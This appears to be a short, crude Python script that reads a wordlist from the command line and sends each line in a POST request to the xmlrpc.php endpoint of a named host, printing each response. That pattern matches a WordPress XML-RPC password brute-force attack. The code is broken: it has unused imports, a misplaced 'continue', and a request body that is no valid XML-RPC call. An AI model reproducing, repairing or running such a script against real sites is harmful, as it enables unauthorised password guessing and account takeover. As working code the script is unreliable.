import requests
import socket
import string 
import sys
import threading

wordlist = sys.argv[1]     # SET CUSTOM WORDLIS

with open(wordlist, 'r') as f:
     for line in f.read().splitlines():
        passwds = line
        r =requests.post('http://macaxeirateste.tk/xmlrpc.php', line)
        print(r.text)
     continue
     
    
#data = {'username':'Olivia','password':'123'}

